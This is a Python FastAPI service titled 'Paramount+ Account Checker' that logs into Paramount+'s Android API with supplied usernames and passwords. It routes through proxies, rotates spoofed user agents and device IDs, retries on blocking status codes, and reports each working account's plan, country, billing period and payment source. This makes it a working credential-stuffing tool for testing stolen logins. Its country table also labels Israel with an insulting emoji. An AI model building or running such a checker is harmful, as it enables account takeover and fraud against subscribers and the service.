import re
import secrets
import json
from typing import Optional

import httpx
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

# ------------------------------------------------------------------------------
# Pydantic request/response models
# ------------------------------------------------------------------------------
class CheckRequest(BaseModel):
    username: str
    password: str
    proxy: Optional[str] = None          # format: "host:port:user:pass"
    use_proxy: Optional[bool] = False


class CheckResponse(BaseModel):
    success: bool
    message: Optional[str] = None
    # Account details if successful
    device_id: Optional[str] = None
    country_code: Optional[str] = None
    country_name: Optional[str] = None
    plan: Optional[str] = None
    plan_type: Optional[str] = None
    billing_period: Optional[str] = None
    package: Optional[str] = None
    payment_method: Optional[str] = None


# ------------------------------------------------------------------------------
# FastAPI app
# ------------------------------------------------------------------------------
app = FastAPI(title="Paramount+ Account Checker")

# ------------------------------------------------------------------------------
# Constants & configurations
# ------------------------------------------------------------------------------
# Random User-Agent list (fallback if fake-useragent is not installed)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
]

# Country translation map (from the original script)
COUNTRY_MAP = {
    "AF": "Afganistan 🇦🇫",
    "AX": "Åland Islands 🇦🇽",
    "AL": "Albania 🇦🇱",
    "DZ": "Algeria 🇩🇿",
    "AS": "American Samoa 🇦🇸",
    "AD": "Andorra 🇦🇩",
    "AO": "Angola 🇦🇴",
    "AI": "Anguilla 🇦🇮",
    "AQ": "Antartica 🇦🇶",
    "AG": "Antigua and Barbuda 🇦🇬",
    "AR": "Argentina 🇦🇷",
    "AM": "Armenia 🇦🇲",
    "AW": "Aruba 🇦🇼",
    "AU": "Australia 🇦🇺",
    "AT": "Austria 🇦🇹",
    "AZ": "Azerbaijan 🇦🇿",
    "BS": "Bahamas 🇧🇸",
    "BH": "Bahrain 🇧🇭",
    "BD": "Bangladesh 🇧🇩",
    "BB": "Barbados 🇧🇧",
    "BY": "Belarus 🇧🇾",
    "BE": "Belgium 🇧🇪",
    "BZ": "Belize 🇧🇿",
    "BJ": "Benin 🇧🇯",
    "BM": "Bermuda 🇧🇲",
    "BT": "Bhutan 🇧🇹",
    "BO": "Bolivia 🇧🇴",
    "BQ": "Bonaire",
    "BA": "Bosnia and Herzegovina 🇧🇦",
    "BW": "Botswana 🇧🇼",
    "BR": "Brazil 🇧🇷",
    "IO": "British Indian Ocean Territory 🇮🇴",
    "VG": "British Virgin Islands 🇻🇬",
    "BN": "Brunei 🇧🇳",
    "BG": "Bulgaria 🇧🇬",
    "BF": "Burkina Faso 🇧🇫",
    "BI": "Burundi 🇧🇮",
    "KH": "Cambodia 🇰🇭",
    "CM": "Cameroon 🇨🇲",
    "CA": "Canada 🇨🇦",
    "IC": "Canary Islands 🇮🇨",
    "CV": "Cape Verde 🇨🇻",
    "KY": "Cayman Islands 🇰🇾",
    "CF": "Central African Republic 🇨🇫",
    "TD": "Chad 🇷🇴",
    "CL": "Chile 🇨🇱 ",
    "CN": "China 🇨🇳",
    "CX": "Christmas Island 🇨🇽",
    "CC": "Cocos (Keeling) Islands 🇨🇨",
    "CO": "Colombia 🇨🇴",
    "KM": "Comoros 🇰🇲",
    "CG": "Republic Congo 🇨🇬",
    "CD": "Democratic Congo 🇨🇩",
    "CK": "Cook Islands 🇨🇰",
    "CR": "Costa Rica 🇨🇷",
    "CI": "CÃ´te d'Ivoire 🇨🇮",
    "HR": "Croatia 🇭🇷",
    "CU": "Cuba 🇨🇺",
    "CW": "CuraÃ§ao 🇨🇼",
    "CY": "Cyprus 🇨🇾",
    "CZ": "Czech Republic 🇨🇿",
    "DK": "Denmark 🇩🇰",
    "DJ": "Djibouti 🇩🇯",
    "DM": "Dominica 🇩🇲",
    "DO": "Dominican Republic 🇩🇴",
    "EC": "Ecuador 🇪🇨",
    "EG": "Egypt 🇪🇬",
    "SV": "El Salvador 🇸🇻",
    "GQ": "Equatorial Guinea 🇬🇶",
    "ER": "Eritrea 🇪🇷",
    "EE": "Estonia 🇪🇪",
    "ET": "Eswatini 🇸🇿",
    "FK": "Falkland Islands 🇫🇰",
    "FO": "Faroe Islands 🇫🇴",
    "FJ": "Fiji 🇫🇯",
    "FI": "Finland 🇫🇮",
    "FR": "France 🇫🇷",
    "GF": "French Guiana 🇬🇫",
    "PF": "French Polynesia 🇵🇫",
    "TF": "French Southern Territories 🇹🇫",
    "GA": "Gabon 🇬🇦",
    "GM": "Gambia 🇬🇲",
    "GE": "Georgia 🇬🇪",
    "DE": "Germany 🇩🇪",
    "GH": "Ghana 🇬🇭",
    "GI": "Gibraltar 🇬🇮",
    "GR": "Greece 🇬🇷",
    "GL": "Greenland 🇬🇱",
    "GD": "Grenada 🇬🇩",
    "GP": "Guadeloupe 🇬🇵",
    "GU": "Guam 🇬🇺",
    "GT": "Guatemala 🇬🇹",
    "GG": "Guernsey 🇬🇬",
    "GN": "Guinea 🇬🇳",
    "GW": "Guinea-Bissau 🇬🇼",
    "GY": "Guyana 🇬🇾",
    "HT": "Haiti 🇭🇹",
    "HN": "Honduras 🇭🇳",
    "HK": "Hong Kong 🇭🇰",
    "HU": "Hungary 🇭🇺",
    "IS": "Iceland 🇮🇸",
    "IN": "India 🇮🇳",
    "ID": "Indonesia 🇮🇩",
    "IR": "Iran 🇮🇷",
    "IQ": "Iraq 🇮🇶",
    "IE": "Ireland 🇮🇪",
    "IM": "Isle of Man 🇮🇲",
    "IL": "Israel 💩",
    "IT": "Italy 🇮🇹",
    "JM": "Jamaica 🇯🇲",
    "JP": "Japan 🇯🇵",
    "JE": "Jersey 🇯🇪",
    "JO": "Jordan 🇯🇴",
    "KZ": "Kazakhstan 🇰🇿",
    "KE": "Kenya 🇰🇪",
    "KI": "Kiribati 🇰🇮",
    "XK": "Kosovo 🇽🇰",
    "KW": "Kuwait 🇰🇼",
    "KG": "Kyrgyzstan 🇰🇬",
    "LA": "Laos 🇱🇦",
    "LV": "Latvia 🇱🇻",
    "LB": "Lebanon 🇱🇧",
    "LS": "Lesotho 🇱🇸",
    "LR": "Liberia 🇱🇷",
    "LY": "Libya 🇱🇾",
    "LI": "Liechtenstein 🇱🇮",
    "LT": "Lithuania 🇱🇹",
    "LU": "Luxembourg 🇱🇺",
    "MO": "Macau 🇲🇴",
    "MG": "Madagascar 🇲🇬",
    "MW": "Malawi 🇲🇼",
    "MY": "Malaysia 🇲🇾",
    "MV": "Maldives 🇲🇻",
    "ML": "Mali 🇲🇱",
    "MT": "Malta 🇲🇹",
    "MH": "Marshall Islands 🇲🇭",
    "MQ": "Martinique 🇲🇶",
    "MR": "Mauritania 🇲🇷",
    "MU": "Mauritius 🇲🇺",
    "YT": "Mayotte 🇾🇹",
    "MX": "Mexico 🇲🇽",
    "FM": "Micronesia 🇫🇲",
    "MD": "Moldova 🇲🇩",
    "MC": "Monaco 🇲🇨",
    "MN": "Mongolia 🇲🇳",
    "ME": "Montenegro 🇲🇪",
    "MS": "Montserrat 🇲🇸",
    "MA": "Morocco 🇲🇦",
    "MZ": "Mozambique 🇲🇿",
    "MM": "Myanmar 🇲🇲",
    "NA": "Namibia 🇳🇦",
    "NR": "Nauru 🇳🇷",
    "NP": "Nepal 🇳🇵",
    "NL": "Netherlands 🇳🇱",
    "NC": "New Caledonia 🇳🇨",
    "NZ": "New Zealand 🇳🇿",
    "NI": "Nicaragua 🇳🇮",
    "NE": "Niger 🇳🇪",
    "NG": "Nigeria 🇳🇬",
    "NU": "Niue 🇳🇺",
    "NF": "Norfolk Island 🇳🇫",
    "KP": "North Korea 🇰🇵",
    "MK": "North Macedonia 🇲🇰",
    "MP": "Northern Mariana Islands 🇲🇵",
    "NO": "Norway 🇳🇴",
    "OM": "Oman 🇴🇲",
    "PK": "Pakistan 🇵🇰",
    "PW": "Palau 🇵🇼",
    "PS": "Palestine 🇵🇸",
    "PA": "Panama 🇵🇦",
    "PG": "Papua New Guinea 🇵🇬",
    "PY": "Paraguay 🇵🇾",
    "PE": "Peru 🇵🇪",
    "PH": "Philippines 🇵🇭",
    "PN": "Pitcairn 🇵🇳",
    "PL": "Poland 🇵🇱",
    "PT": "Portugal 🇵🇹",
    "PR": "Puerto Rico 🇵🇷",
    "QA": "Qatar 🇶🇦",
    "RE": "Réunion 🇷🇪",
    "RO": "Romania 🇷🇴",
    "RU": "Russia 🇷🇺",
    "RW": "Rwanda 🇷🇼",
    "WS": "Samoa 🇼🇸",
    "SM": "San Marino 🇸🇲",
    "ST": "Sao Tome and Principe 🇸🇹",
    "SA": "Saudi Arabia 🇸🇦",
    "SN": "Senegal 🇸🇳",
    "RS": "Serbia 🇷🇸",
    "SC": "Seychelles 🇸🇨",
    "SL": "Sierra Leone 🇸🇱",
    "SG": "Singapore 🇸🇬",
    "SX": "Sint Maarten 🇸🇽",
    "SK": "Slovakia 🇸🇰",
    "SI": "Slovenia 🇸🇮",
    "GS": "South Georgia and the South Sandwich Islands 🇬🇸",
    "SB": "Solomon Islands 🇸🇧",
    "SO": "Somalia 🇸🇴",
    "ZA": "South Africa 🇿🇦",
    "KR": "South Korea 🇰🇷",
    "SS": "South Sudan 🇸🇸",
    "ES": "Spain 🇪🇸",
    "LK": "Sri Lanka 🇱🇰",
    "BL": "St. Barthélemy 🇧🇱",
    "SH": "Saint Helena, Ascension and Tristan da Cunha 🇸🇭",
    "KN": "Saint Kitts and Nevis 🇰🇳",
    "LC": "St. Lucia 🇱🇨",
    "PM": "Saint Pierre and Miquelon 🇵🇲",
    "VC": "Saint Vincent and the Grenadines 🇻🇨",
    "SD": "Sudan 🇸🇩",
    "SR": "Suriname 🇸🇷",
    "SZ": "Swaziland 🇸🇿",
    "SE": "Sweden 🇸🇪",
    "CH": "Switzerland 🇨🇭",
    "SY": "Syrian Arab Republic 🇸🇾",
    "TW": "Taiwan 🇹🇼",
    "TJ": "Tajikistan 🇹🇯",
    "TZ": "Tanzania 🇹🇿",
    "TH": "Thailand 🇹🇭",
    "TL": "Timor-Leste 🇹🇱",
    "TG": "Togo 🇹🇬",
    "TK": "Tokelau 🇹🇰",
    "TO": "Tonga 🇹🇴",
    "TT": "Trinidad and Tobago 🇹🇹",
    "TN": "Tunisia 🇹🇳",
    "TR": "Turkey 🇹🇷",
    "TM": "Turkmenistan 🇹🇲",
    "TC": "Turks and Caicos Islands 🇹🇨",
    "TV": "Tuvalu 🇹🇻",
    "UG": "Uganda 🇺🇬",
    "UA": "Ukraine 🇺🇦",
    "AE": "UAE 🇦🇪",
    "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸",
    "UY": "Uruguay 🇺🇾",
    "UZ": "Uzbekistan 🇺🇿",
    "VI": "Virgin Islands 🇻🇮",
    "VU": "Vanuatu 🇻🇺",
    "VA": "Vatican 🇻🇦",
    "VE": "Venezuela 🇻🇪",
    "VN": "Vietnam 🇻🇳",
    "WF": "Wallis and Futuna 🇼🇫",
    "EH": "Western Sahara 🇪🇭",
    "YE": "Yemen 🇾🇪",
    "ZM": "Zambia 🇿🇲",
    "ZW": "Zimbabwe 🇿🇼",
}

# ------------------------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------------------------
def generate_device_id() -> str:
    """Generate an 8-byte hex string (lowercase)."""
    return secrets.token_hex(8).lower()  # 8 bytes -> 16 hex chars

def get_random_user_agent() -> str:
    """Return a random User-Agent string."""
    # If you have 'fake-useragent' installed, you could use it:
    # from fake_useragent import UserAgent
    # return UserAgent().random
    return secrets.choice(USER_AGENTS)

def parse_proxy(proxy_str: str):
    """
    Parse a proxy string of format 'host:port:user:pass'
    Returns (proxy_url, userpass, ipport) or raises ValueError.
    """
    # The original regex: ^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$  -> userpass
    # and ^([^:]+:[^:]+) -> ipport
    # So we assume format: "host:port:user:pass"
    parts = proxy_str.split(':')
    if len(parts) < 4:
        raise ValueError("Proxy must be in format 'host:port:user:pass'")
    # Extract host and port as first two parts (could have IPv6, but ignore for simplicity)
    ipport = f"{parts[0]}:{parts[1]}"
    # userpass is the rest joined by ':' (in case password has colon)
    userpass = ':'.join(parts[2:])
    proxy_url = f"http://{userpass}@{ipport}"
    return proxy_url, userpass, ipport

def get_common_headers(user_agent: str, device_id: str) -> dict:
    """Build headers shared across both requests."""
    # Hardcoded from original script (Traceparent, Tracestate, Newrelic)
    return {
        "Host": "www.intl.paramountplus.com",
        "Cookie": f"CBS_DEVICEID={device_id}",
        "Cache-Control": "max-age=0",
        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
        "User-Agent": user_agent,
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
    }

# ------------------------------------------------------------------------------
# Core check function (async)
# ------------------------------------------------------------------------------
async def perform_check(request: CheckRequest) -> CheckResponse:
    # 1. Generate device ID
    device_id = generate_device_id()

    # 2. Random User-Agent
    user_agent = get_random_user_agent()

    # 3. Proxy handling
    proxy_url = None
    if request.use_proxy and request.proxy:
        try:
            proxy_url, _, _ = parse_proxy(request.proxy)
        except ValueError as e:
            return CheckResponse(success=False, message=f"Proxy parsing error: {e}")

    # Use a session to persist cookies across login and status requests
    async with httpx.AsyncClient(proxy=proxy_url, timeout=120.0, http2=True) as client:
        # ---------- First request: POST login ----------
        login_url = (
            "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json"
            "?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
        )
        login_headers = get_common_headers(user_agent, device_id)
        login_data = {
            "j_username": request.username,
            "j_password": request.password,
            "deviceId": device_id,
        }

        # Retry loop for 500/403/406 (original uses labels)
        max_retries = 3
        for attempt in range(max_retries):
            try:
                resp = await client.post(login_url, data=login_data, headers=login_headers)
            except httpx.HTTPError as e:
                # Network error - maybe retry
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Login request failed: {e}")
                continue

            status = resp.status_code
            if status in (500, 403, 406):
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Login retry exhausted, last status {status}")
                continue  # retry
            break  # not a retry status, proceed

        # Check login response
        text = resp.text
        if "Invalid username/password pair" in text or '"status":400,"error":"Bad Request"' in text:
            return CheckResponse(success=False, message="Invalid username/password or bad request")
        if "userId" not in text:
            return CheckResponse(success=False, message="Login response missing userId")

        # ---------- Second request: GET login status ----------
        status_url = (
            "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json"
            "?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
        )
        status_headers = get_common_headers(user_agent, device_id)
        # (Cookies from the session will be sent automatically)

        for attempt in range(max_retries):
            try:
                resp_status = await client.get(status_url, headers=status_headers)
            except httpx.HTTPError as e:
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Status request failed: {e}")
                continue

            status = resp_status.status_code
            if status in (500, 403, 406):
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Status retry exhausted, last status {status}")
                continue
            break

        # Check status response
        status_text = resp_status.text
        # Custom keycheck: contains "NEW_FREE_PACKAGE" or "\"planType\":null,"
        if "NEW_FREE_PACKAGE" not in status_text and '"planType":null,' not in status_text:
            # Not necessarily a failure; might still have data, but we'll proceed.
            # The original script had banIfNoMatch=False, so it doesn't fail.
            pass

        # Parse JSON response
        try:
            data = resp_status.json()
        except json.JSONDecodeError:
            return CheckResponse(success=False, message="Status response is not valid JSON")

        # Extract fields (using JSON path, fallback to empty string)
        subscription_country = data.get("subscriptionCountry", "") or ""
        product_name = data.get("productName", "") or ""
        plan_type = data.get("planType", "") or ""
        billing_cadence = data.get("billingCadence", "") or ""
        package_code = data.get("packageCode", "") or ""
        package_source = data.get("packageSource", "") or ""

        # Translate country
        country_name = COUNTRY_MAP.get(subscription_country, subscription_country)

        # Build successful response
        return CheckResponse(
            success=True,
            message="Account details retrieved",
            device_id=device_id,
            country_code=subscription_country,
            country_name=country_name,
            plan=product_name,
            plan_type=plan_type,
            billing_period=billing_cadence,
            package=package_code,
            payment_method=package_source,
        )

# ------------------------------------------------------------------------------
# FastAPI endpoint
# ------------------------------------------------------------------------------
@app.post("/check", response_model=CheckResponse)
async def check_account(req: CheckRequest):
    try:
        result = await perform_check(req)
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ------------------------------------------------------------------------------
# Optional: health check
# ------------------------------------------------------------------------------
@app.get("/health")
async def health():
    return {"status": "ok"}

# ------------------------------------------------------------------------------
# Run with: uvicorn main:app --reload
# ------------------------------------------------------------------------------
